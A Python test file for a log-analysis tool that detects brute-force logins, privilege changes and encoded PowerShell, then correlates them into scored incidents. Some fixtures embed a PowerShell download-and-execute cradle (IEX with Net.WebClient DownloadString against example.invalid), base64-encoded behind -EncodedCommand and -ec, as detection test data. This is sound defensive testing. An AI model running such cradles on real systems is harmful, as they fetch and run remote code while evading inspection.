import hashlib
import base64
import json
from dataclasses import replace
from datetime import datetime, timedelta, timezone

from trace_verified.detection import DetectionConfig, Finding, detect
from trace_verified.ingestion import ingest_file
from trace_verified.incidents import IncidentConfig, correlate_findings
from trace_verified.schemas import CanonicalEvent, Severity


BASE = datetime.fromisoformat("2026-04-10T10:00:00+00:00")


def finding(fid, rule, minute, *, user="alice", host="ws-1", ip="203.0.113.10", event_ids=None,
            original=None, decoded=None, rationale=None):
    observed = BASE + timedelta(minutes=minute) if minute is not None else None
    return Finding(
        finding_id=fid, detector_id=rule.split(".")[0], rule_id=rule,
        title=rule.replace(".", " "), description="fixture evidence",
        user=user, host=host, source_ip=ip, source_device=None,
        first_observed=observed, last_observed=observed,
        supporting_event_ids=event_ids or ["evt-" + fid],
        rationale=rationale or [], limitations=[], severity_contribution=Severity.MEDIUM,
        original_command_line=original, decoded_command_line=decoded,
        decode_status="decoded" if decoded else None,
    )


def event(event_id, minute, kind):
    observed = BASE + timedelta(minutes=minute) if minute is not None else None
    return CanonicalEvent(event_id, hashlib.sha256(event_id.encode()).hexdigest(), observed,
        "alice", "ws-1", kind, "incident-test.jsonl", {"event_type": kind})


def test_complete_multistage_chain_is_correlated_and_outscores_isolated_low_risk():
    chain = [
        finding("f-credential", "auth.brute_force", 0, event_ids=["e1", "e2"]),
        finding("f-success", "auth.success_after_failures", 1, event_ids=["e3", "e4"]),
        finding("f-privilege", "privilege.change", 2, event_ids=["e5"]),
        finding("f-process", "process.suspicious", 3, event_ids=["e6"],
                original="powershell -EncodedCommand AAA=", decoded="IEX DownloadString('x')",
                rationale=["Matched rule(s): powershell_encoded, powershell_obfuscation."]),
    ]
    events = [event(f"e{i}", i - 1, "test_event") for i in range(1, 7)]
    report = correlate_findings(reversed(chain), events)
    incident = report.incidents[0]
    assert len(report.incidents) == 1
    assert incident.finding_ids == sorted(item.finding_id for item in chain)
    assert incident.supporting_event_ids == [f"e{i}" for i in range(1, 7)]
    assert [item.timestamp for item in incident.timeline] == sorted(item.timestamp for item in incident.timeline)
    stages = {stage.stage_id for stage in incident.attack_stages}
    assert {"credential_attack", "successful_authentication", "privilege_change",
            "suspicious_execution", "defense_evasion"} <= stages
    isolated = correlate_findings([finding("solo", "process.suspicious", 1)]).incidents[0]
    assert incident.score > isolated.score
    assert incident.severity == Severity.CRITICAL
    assert sum(item.points for item in incident.score_breakdown) == incident.score
    contributions = {item.code: item.points for item in incident.score_breakdown}
    assert contributions["authentication_outcome"] == 5
    assert contributions["stage_diversity"] == 15
    assert contributions["stage_order"] == 15


def test_credential_attack_stage_names_only_the_accounts_present_in_evidence():
    one_account = correlate_findings([
        finding("one-account", "auth.brute_force", 0, user=r"CONTOSO\Alice")
    ]).incidents[0]
    rationale = next(stage.rationale for stage in one_account.attack_stages
                     if stage.stage_id == "credential_attack")
    assert "one account" in rationale
    assert "multiple accounts" not in rationale

    spray = replace(finding("two-accounts", "auth.password_spray", 0, user=None),
                    targeted_users=[r"CONTOSO\Alice", "contoso\\bob"])
    multiple_accounts = correlate_findings([spray]).incidents[0]
    rationale = next(stage.rationale for stage in multiple_accounts.attack_stages
                     if stage.stage_id == "credential_attack")
    assert "multiple distinct accounts" in rationale

    duplicate_aliases = replace(finding("same-account", "auth.password_spray", 0, user=None),
                                targeted_users=[r"CONTOSO\Alice", r"contoso\alice"])
    single_distinct_account = correlate_findings([duplicate_aliases]).incidents[0]
    rationale = next(stage.rationale for stage in single_distinct_account.attack_stages
                     if stage.stage_id == "credential_attack")
    assert "one account" in rationale
    assert "multiple accounts" not in rationale


def test_users_sharing_ip_are_never_merged_and_no_lateral_stage_is_inferred():
    left = finding("user-a", "auth.success_after_failures", 0, user="alice", host="ws-a", ip="198.51.100.1")
    right = finding("user-b", "auth.success_after_failures", 1, user="bob", host="ws-b", ip="198.51.100.1")
    report = correlate_findings([left, right])
    assert len(report.incidents) == 2
    assert all("lateral_movement" not in {stage.stage_id for stage in incident.attack_stages}
               for incident in report.incidents)


def test_legitimate_same_user_authentication_on_multiple_hosts_is_not_labeled_lateral_movement():
    findings = [finding("success-a", "auth.success_after_failures", 0, host="ws-a"),
                finding("success-b", "auth.success_after_failures", 4, host="ws-b")]
    incident = correlate_findings(findings).incidents[0]
    assert incident.affected_hosts == ["ws-a", "ws-b"]
    stages = {stage.stage_id for stage in incident.attack_stages}
    assert "multi_host_authentication" in stages
    assert "lateral_movement" not in stages
    multi_host_stage = next(stage for stage in incident.attack_stages if stage.stage_id == "multi_host_authentication")
    assert "does not establish lateral movement" in multi_host_stage.rationale
    assert next(item for item in incident.score_breakdown if item.code == "stage_diversity").points == 0
    assert next(item for item in incident.score_breakdown if item.code == "stage_order").points == 0
    spread = next(item for item in incident.score_breakdown if item.code == "host_spread")
    assert spread.points == 5


def test_missing_identity_fields_are_conservative():
    same_host_no_user = [finding("no-user-1", "process.suspicious", 0, user=None, host="ws-a"),
                         finding("no-user-2", "privilege.change", 1, user=None, host="ws-a")]
    report = correlate_findings(same_host_no_user)
    assert len(report.incidents) == 2
    no_host_same_account_and_ip = [finding("no-host-1", "auth.brute_force", 0, host=None),
                                   finding("no-host-2", "auth.success_after_failures", 1, host=None)]
    assert len(correlate_findings(no_host_same_account_and_ip).incidents) == 1
    changed_ip_and_host = [finding("changed-context-1", "auth.success_after_failures", 0, host="ws-a", ip="203.0.113.10"),
                           finding("changed-context-2", "auth.success_after_failures", 1, host="ws-b", ip="203.0.113.11")]
    assert len(correlate_findings(changed_ip_and_host).incidents) == 2


def test_placeholder_source_ips_cannot_merge_same_user_across_hosts():
    for placeholder in ("-", "0.0.0.0", "127.0.0.1", "::1"):
        rows = [finding(f"placeholder-a-{placeholder}", "auth.brute_force", 0, host="ws-a", ip=placeholder),
                finding(f"placeholder-b-{placeholder}", "process.suspicious", 1, host="ws-b", ip=placeholder)]
        assert len(correlate_findings(rows).incidents) == 2


def test_out_of_order_timestamps_and_incident_ids_are_deterministic():
    rows = [finding("late", "privilege.change", 8), finding("early", "auth.brute_force", 1)]
    first = correlate_findings(rows).incidents[0]
    second = correlate_findings(reversed(rows)).incidents[0]
    assert first.incident_id == second.incident_id
    assert first.first_observed == BASE + timedelta(minutes=1)
    assert first.last_observed == BASE + timedelta(minutes=8)


def test_duplicate_findings_do_not_duplicate_evidence_or_score():
    row = finding("same", "auth.brute_force", 0, event_ids=["evt-one", "evt-two"])
    report = correlate_findings([row, row])
    incident = report.incidents[0]
    assert report.duplicate_findings_ignored == 1
    assert len(incident.finding_ids) == 1
    assert incident.supporting_event_ids == ["evt-one", "evt-two"]
    assert incident.score == 40


def test_distinct_findings_reusing_identical_event_evidence_are_not_double_counted():
    first = finding("same-evidence-a", "auth.brute_force", 0, event_ids=["shared-event"])
    second = finding("same-evidence-b", "auth.brute_force", 0, event_ids=["shared-event"])
    incident = correlate_findings([first, second]).incidents[0]
    assert len(incident.finding_ids) == 2
    assert incident.score == 40
    contributions = [item.points for item in incident.score_breakdown if item.category == "detector_severity"
                    and item.code.startswith("finding_severity:")]
    assert sorted(contributions) == [0, 40]


def test_shared_evidence_is_credited_to_the_strongest_detector_contribution():
    low = finding("shared-low", "auth.brute_force", 0, event_ids=["same-auth-event"])
    high = finding("shared-high", "auth.brute_force", 0, event_ids=["same-auth-event"])
    low.severity_contribution = Severity.MEDIUM
    high.severity_contribution = Severity.HIGH
    incident = correlate_findings([low, high]).incidents[0]
    assert incident.score == 60
    contribution = {item.code: item.points for item in incident.score_breakdown
                    if item.code.startswith("finding_severity:")}
    assert contribution["finding_severity:shared-high"] == 60
    assert contribution["finding_severity:shared-low"] == 0


def test_repeated_same_rule_findings_are_capped_and_approved_activity_is_excluded():
    repeated = [finding("brute-a", "auth.brute_force", 0), finding("brute-b", "auth.brute_force", 2)]
    incident = correlate_findings(repeated).incidents[0]
    assert incident.score == 40
    approved = correlate_findings([finding("approved-process", "process.suspicious", 0)], config=
        IncidentConfig(approved_activity_finding_ids=frozenset({"approved-process"}))).incidents[0]
    assert approved.score == 0
    assert approved.score == 0
    assert approved.approved_finding_ids == ["approved-process"]
    assert any(item.points == 0 and item.code == "approved_findings_excluded" for item in approved.score_breakdown)


def test_failed_authentication_without_success_gets_no_success_points():
    incident = correlate_findings([finding("failed", "auth.brute_force", 0)]).incidents[0]
    outcome = next(item for item in incident.score_breakdown if item.code == "authentication_outcome")
    assert outcome.points == 0
    assert "failed/blocked" in outcome.explanation
    assert any("does not establish whether access succeeded" in item for item in incident.missing_evidence)


def test_time_and_size_limits_are_inclusive_and_configurable():
    exact = [finding("at-zero", "auth.brute_force", 0), finding("at-ten", "privilege.change", 10)]
    assert len(correlate_findings(exact, config=IncidentConfig(correlation_window=timedelta(minutes=10))).incidents) == 1
    beyond = [finding("at-zero-2", "auth.brute_force", 0), finding("after-ten", "privilege.change", 10.01)]
    assert len(correlate_findings(beyond, config=IncidentConfig(correlation_window=timedelta(minutes=10))).incidents) == 2
    limited = [finding(f"cap-{index}", "auth.brute_force", index) for index in range(3)]
    report = correlate_findings(limited, config=IncidentConfig(max_incident_findings=2))
    assert [len(incident.finding_ids) for incident in report.incidents] == [2, 1]


def test_successful_access_bonus_and_score_thresholds_are_transparent():
    failed = correlate_findings([finding("fail-only", "auth.brute_force", 0)]).incidents[0]
    successful = correlate_findings([finding("success", "auth.success_after_failures", 0)]).incidents[0]
    assert successful.score > failed.score
    assert next(item for item in successful.score_breakdown if item.code == "authentication_outcome").points == 5
    assert "heuristic" in successful.scoring_notice.casefold()


def test_bridge_finding_merges_two_related_incident_clusters_within_caps():
    first = finding("bridge-a", "auth.brute_force", 0, host="ws-a", ip="203.0.113.1")
    second = finding("bridge-b", "process.suspicious", 1, host="ws-b", ip="203.0.113.2")
    bridge = finding("bridge-c", "privilege.change", 2, host="ws-a", ip="203.0.113.2")
    report = correlate_findings([first, second, bridge])
    assert len(report.incidents) == 1
    incident = report.incidents[0]
    assert set(incident.finding_ids) == {"bridge-a", "bridge-b", "bridge-c"}
    assert all(item.reason for item in incident.correlation_rationale)


def test_high_detector_contribution_is_preserved_for_standalone_findings():
    high = finding("high-priv", "privilege.change", 0, event_ids=["evt-high"])
    high.severity_contribution = Severity.HIGH
    incident = correlate_findings([high]).incidents[0]
    assert incident.score == 60
    assert incident.severity == Severity.HIGH
    contribution = next(item for item in incident.score_breakdown if item.code == "finding_severity:high-priv")
    assert contribution.points == 60


def test_incidents_are_sorted_by_score_then_time_and_id():
    low = finding("low", "auth.brute_force", 0, user="bob")
    high = finding("high", "privilege.change", 5)
    high.severity_contribution = Severity.HIGH
    incidents = correlate_findings([low, high]).incidents
    assert [item.finding_ids for item in incidents] == [["high"], ["low"]]


def test_one_encoded_execution_does_not_create_artificial_stage_bonus():
    process = finding("encoded", "process.suspicious", 0, event_ids=["same-event"],
                      original="powershell -EncodedCommand AAA=", decoded="Write-Output ok",
                      rationale=["Matched rule(s): powershell_encoded, powershell_obfuscation."])
    incident = correlate_findings([process]).incidents[0]
    breakdown = {item.code: item.points for item in incident.score_breakdown}
    assert {stage.stage_id for stage in incident.attack_stages} == {"suspicious_execution", "defense_evasion"}
    assert breakdown["stage_diversity"] == 0
    assert breakdown["stage_order"] == 0


def test_decoded_abbreviated_encoded_command_evidence_drives_evasion_stage():
    payload = "Write-Output 'x'; IEX (New-Object Net.WebClient).DownloadString('http://example.invalid/a')"
    encoded = base64.b64encode(payload.encode("utf-16le")).decode("ascii")
    process_event = event("abbrev-evasion", 0, "process_start")
    process_event.process = "powershell.exe"
    process_event.command_line = f"powershell.exe -ec {encoded}"
    report = detect([process_event])
    finding_row = next(item for item in report.findings if item.rule_id == "process.suspicious")
    assert finding_row.decode_status == "decoded"
    assert "-ec" in finding_row.original_command_line
    incident = correlate_findings(report.findings, [process_event]).incidents[0]
    assert "defense_evasion" in {stage.stage_id for stage in incident.attack_stages}


def test_benign_encoded_command_is_visible_without_an_attack_stage():
    payload = "Write-Output 'routine inventory check'"
    encoded = base64.b64encode(payload.encode("utf-16le")).decode("ascii")
    process_event = event("benign-encoded", 0, "process_start")
    process_event.process = "powershell.exe"
    process_event.command_line = f"powershell.exe -e {encoded}"
    report = detect([process_event])
    finding_row = next(item for item in report.findings if item.rule_id == "process.suspicious")
    assert finding_row.decode_status == "decoded"
    assert finding_row.severity_contribution == Severity.LOW
    incident = correlate_findings(report.findings, [process_event]).incidents[0]
    assert incident.attack_stages == []
    assert incident.title.endswith("Encoded PowerShell command observed")


def test_raw_success_is_linked_only_with_user_and_host_or_user_and_source():
    failures = [event(f"failure-{i}", i, "4625") for i in range(5)]
    for row in failures:
        row.raw_record.update({"Status": "0xC000006A"})
        row.source_ip = "203.0.113.10"
    success = event("raw-success", 6, "4624")
    success.source_ip = "203.0.113.10"
    success.user = "alice"
    success.host = "WS-1."
    rows = failures + [success]
    detected = detect(rows)
    incident = correlate_findings(detected.findings, rows).incidents[0]
    assert "successful_authentication" in {stage.stage_id for stage in incident.attack_stages}
    assert "raw-success" in incident.supporting_event_ids
    assert not any("does not establish" in text for text in incident.missing_evidence)


def test_raw_success_with_conflicting_ip_or_before_failure_interval_is_not_linked():
    credential = finding("credential-context", "auth.brute_force", 1, event_ids=["failure-evidence"])
    credential.last_observed = BASE + timedelta(minutes=2)
    conflicting = event("conflicting-ip-success", 4, "4624")
    conflicting.source_ip = "203.0.113.99"
    conflicting.host = credential.host
    before = event("early-success", 0, "4624")
    before.source_ip = credential.source_ip
    before.host = credential.host

    for success_event in (conflicting, before):
        incident = correlate_findings([credential], [success_event]).incidents[0]
        stages = {stage.stage_id for stage in incident.attack_stages}
        assert "successful_authentication" not in stages
        outcome = next(item for item in incident.score_breakdown if item.code == "authentication_outcome")
        assert outcome.points == 0
        assert success_event.event_id not in incident.supporting_event_ids


def test_success_stage_timestamp_and_incident_bounds_use_actual_success_event():
    success_finding = finding("detected-success", "auth.success_after_failures", 0,
                              event_ids=["failure-1", "success-1"])
    success_finding.last_observed = BASE + timedelta(minutes=5)
    report = correlate_findings([success_finding])
    stage = next(stage for stage in report.incidents[0].attack_stages
                 if stage.stage_id == "successful_authentication")
    assert stage.observed_at == BASE + timedelta(minutes=5)

    credential = finding("linked-credential", "auth.brute_force", 0, event_ids=["failure-raw"])
    credential.last_observed = BASE + timedelta(minutes=2)
    raw_success = event("later-raw-success", 8, "4624")
    raw_success.source_ip = credential.source_ip
    raw_success.host = credential.host
    incident = correlate_findings([credential], [raw_success]).incidents[0]
    stage = next(stage for stage in incident.attack_stages if stage.stage_id == "successful_authentication")
    assert stage.observed_at == raw_success.timestamp
    assert incident.last_observed == raw_success.timestamp
    assert [row.timestamp for row in incident.timeline] == sorted(row.timestamp for row in incident.timeline)


def test_equivalent_aware_instants_correlate_but_mixed_kinds_are_explicitly_split():
    one = finding("offset-a", "auth.brute_force", 0)
    one.first_observed = datetime.fromisoformat("2026-04-10T10:00:00+02:00")
    one.last_observed = one.first_observed
    two = finding("offset-b", "privilege.change", 1)
    two.first_observed = datetime.fromisoformat("2026-04-10T08:01:00+00:00")
    two.last_observed = two.first_observed
    assert len(correlate_findings([one, two]).incidents) == 1

    naive = finding("naive", "auth.brute_force", 0)
    naive.first_observed = datetime(2026, 4, 10, 10, 0)
    naive.last_observed = naive.first_observed
    aware = finding("aware", "privilege.change", 1)
    aware.first_observed = BASE + timedelta(minutes=1)
    aware.last_observed = aware.first_observed
    split = correlate_findings([naive, aware])
    assert len(split.incidents) == 2
    assert any("naive and timezone-aware" in warning for item in split.incidents for warning in item.correlation_warnings)


def test_timestamp_missing_and_equal_timestamp_do_not_claim_chronological_order():
    same_a = finding("same-a", "auth.brute_force", 0)
    same_b = finding("same-b", "privilege.change", 0)
    same = correlate_findings([same_a, same_b]).incidents[0]
    assert next(row for row in same.score_breakdown if row.code == "stage_order").points == 0

    no_time = [finding("no-time-a", "auth.brute_force", None), finding("no-time-b", "privilege.change", None)]
    report = correlate_findings(no_time)
    assert len(report.incidents) == 2
    assert all(any("no comparable timestamp" in warning for warning in item.correlation_warnings) for item in report.incidents)

    mixed = finding("mixed-interval", "auth.brute_force", 0)
    mixed.last_observed = mixed.last_observed.replace(tzinfo=None)
    result = correlate_findings([mixed]).incidents[0]
    assert any("mixed naive and timezone-aware" in warning for warning in result.correlation_warnings)


def test_duration_limit_and_size_limit_are_reported_on_split_incidents():
    slow = [finding("duration-a", "auth.brute_force", 0), finding("duration-b", "privilege.change", 15)]
    report = correlate_findings(slow, config=IncidentConfig(
        correlation_window=timedelta(minutes=20), max_incident_duration=timedelta(minutes=10)))
    assert len(report.incidents) == 2
    assert any("maximum total incident duration" in warning for item in report.incidents for warning in item.correlation_warnings)

    sized = [finding(f"size-{i}", "auth.brute_force", i) for i in range(3)]
    report = correlate_findings(sized, config=IncidentConfig(max_incident_findings=2))
    assert any("maximum finding count" in warning for item in report.incidents for warning in item.correlation_warnings)


def test_overlapping_findings_use_furthest_existing_end_for_maximum_gap():
    long = finding("long", "auth.brute_force", 0)
    long.last_observed = BASE + timedelta(minutes=20)
    short = finding("short", "privilege.change", 5)
    short.last_observed = BASE + timedelta(minutes=6)
    overlapping = finding("overlap", "process.suspicious", 10)
    overlapping.last_observed = BASE + timedelta(minutes=11)

    report = correlate_findings(
        [long, short, overlapping],
        config=IncidentConfig(correlation_window=timedelta(minutes=2)),
    )

    assert len(report.incidents) == 1
    assert set(report.incidents[0].finding_ids) == {"long", "short", "overlap"}


def test_raw_ingestion_detection_correlation_and_scoring_pipeline(tmp_path):
    evil = "IEX (New-Object Net.WebClient).DownloadString('http://example.invalid/a')"
    encoded = base64.b64encode(evil.encode("utf-16le")).decode("ascii")
    records = []
    for second in range(5):
        records.append({"timestamp": f"2026-04-10T10:00:0{second}Z", "user": "alice", "host": "WS-1.",
                        "event_type": "4625", "source_ip": "203.0.113.10", "status": "0xC000006A"})
    records += [
        {"timestamp": "2026-04-10T10:00:06Z", "user": "alice", "host": "ws-1", "event_type": "4624", "source_ip": "203.0.113.10"},
        {"timestamp": "2026-04-10T10:00:07Z", "user": "alice", "host": "WS-1", "event_type": "4728", "GroupName": "Administrators", "MemberName": "alice"},
        {"timestamp": "2026-04-10T10:00:08Z", "user": "alice", "host": "ws-1", "event_type": "process_start", "process": "powershell.exe", "command_line": f"powershell.exe -EncodedCommand {encoded}"},
    ]
    source = tmp_path / "chain.jsonl"
    source.write_text("\n".join(json.dumps(row) for row in records) + "\n", encoding="utf-8")
    events, _coverage = ingest_file(source)
    findings = detect(events, DetectionConfig()).findings
    incident = correlate_findings(findings, events).incidents[0]
    assert {"credential_attack", "successful_authentication", "privilege_change", "suspicious_execution", "defense_evasion"} <= {
        stage.stage_id for stage in incident.attack_stages}
    assert incident.severity == Severity.CRITICAL
    assert set(incident.supporting_event_ids) == {item.event_id for item in events}


def test_five_versus_six_failures_followed_by_success_is_monotonic(tmp_path):
    scores = []
    for count in (5, 6):
        rows = [{"timestamp": f"2026-04-10T10:00:{second:02d}Z", "user": "alice", "host": "ws-1",
                 "event_type": "4625", "source_ip": "203.0.113.10", "status": "0xC000006A"}
                for second in range(count)]
        rows.append({"timestamp": f"2026-04-10T10:00:{count + 1:02d}Z", "user": "alice", "host": "ws-1",
                     "event_type": "4624", "source_ip": "203.0.113.10"})
        source = tmp_path / f"auth-{count}.jsonl"
        source.write_text("\n".join(json.dumps(row) for row in rows) + "\n", encoding="utf-8")
        events, _ = ingest_file(source)
        findings = detect(events).findings
        scores.append(correlate_findings(findings, events).incidents[0].score)
    assert scores[1] >= scores[0]


def test_detected_success_stage_uses_success_timestamp_and_orders_privilege_after_it(tmp_path):
    records = [{"timestamp": f"2026-04-10T10:00:{second:02d}Z", "user": "alice", "host": "ws-1",
                "event_type": "4625", "source_ip": "203.0.113.10", "status": "0xC000006A"}
               for second in range(5)]
    records.extend([
        {"timestamp": "2026-04-10T10:00:06Z", "user": "alice", "host": "ws-1",
         "event_type": "4624", "source_ip": "203.0.113.10"},
        {"timestamp": "2026-04-10T10:00:08Z", "user": "alice", "host": "ws-1",
         "event_type": "4728", "GroupName": "Administrators", "MemberName": "alice"},
    ])
    source = tmp_path / "chronology.jsonl"
    source.write_text("\n".join(json.dumps(row) for row in records) + "\n", encoding="utf-8")
    events, _ = ingest_file(source)
    report = detect(events)
    incident = correlate_findings(report.findings, events).incidents[0]
    success = next(event for event in events if event.event_type == "4624")
    success_stage = next(stage for stage in incident.attack_stages
                         if stage.stage_id == "successful_authentication")
    assert success_stage.observed_at == success.timestamp
    assert incident.last_observed == events[-1].timestamp
    assert next(item for item in incident.score_breakdown if item.code == "stage_order").points >= 5


def test_raw_privilege_removal_is_not_escalation_and_expected_admin_can_be_approved(tmp_path):
    source = tmp_path / "privilege.jsonl"
    source.write_text("\n".join([
        json.dumps({"timestamp": "2026-04-10T10:00:00Z", "user": "offboarder", "host": "dc-1",
                    "event_type": "4729", "GroupName": "Administrators", "MemberName": "departing-user"}),
        json.dumps({"timestamp": "2026-04-10T10:01:00Z", "user": "approved-admin", "host": "dc-1",
                    "event_type": "4728", "GroupName": "Administrators", "MemberName": "service-user"}),
    ]) + "\n", encoding="utf-8")
    events, _ = ingest_file(source)
    detected = detect(events, DetectionConfig(expected_privilege_actors=frozenset({"approved-admin"})))
    assert len(detected.findings) == 1
    removal = detected.findings[0]
    assert removal.rule_id == "privilege.removal"
    incident = correlate_findings(detected.findings, events).incidents[0]
    assert "privilege_removal" in {stage.stage_id for stage in incident.attack_stages}
    assert "privilege_change" not in {stage.stage_id for stage in incident.attack_stages}
    assert incident.score == 20


def test_benign_admin_workflow_can_be_explicitly_approved_end_to_end(tmp_path):
    benign_script = base64.b64encode("Write-Output 'approved inventory refresh'".encode("utf-16le")).decode()
    records = [{"timestamp": f"2026-04-10T10:00:0{second}Z", "user": "approved-admin", "host": "admin-ws",
                "event_type": "4625", "source_ip": "203.0.113.40", "status": "0xC000006A"}
               for second in range(5)]
    records.extend([
        {"timestamp": "2026-04-10T10:00:06Z", "user": "approved-admin", "host": "admin-ws",
         "event_type": "4624", "source_ip": "203.0.113.40"},
        {"timestamp": "2026-04-10T10:00:07Z", "user": "approved-admin", "host": "admin-ws",
         "event_type": "4728", "GroupName": "Local Admins", "MemberName": "svc-inventory"},
        {"timestamp": "2026-04-10T10:00:08Z", "user": "approved-admin", "host": "admin-ws",
         "event_type": "process_start", "process": "powershell.exe",
         "command_line": f"powershell.exe -EncodedCommand {benign_script}"},
    ])
    source = tmp_path / "admin-workflow.jsonl"
    source.write_text("\n".join(json.dumps(row) for row in records) + "\n", encoding="utf-8")
    events, _ = ingest_file(source)
    detected = detect(events, DetectionConfig(expected_privilege_actors=frozenset({"approved-admin"})))
    assert {finding.rule_id for finding in detected.findings} == {
        "auth.brute_force", "auth.success_after_failures", "process.suspicious"}
    encoded_finding = next(item for item in detected.findings if item.rule_id == "process.suspicious")
    assert encoded_finding.severity_contribution == Severity.LOW
    assert encoded_finding.decode_status == "decoded"
    approval = frozenset(finding.finding_id for finding in detected.findings)
    incident = correlate_findings(detected.findings, events,
                                  IncidentConfig(approved_activity_finding_ids=approval)).incidents[0]
    assert incident.score == 0
    assert incident.approved_finding_ids == sorted(approval)
    assert incident.attack_stages == []
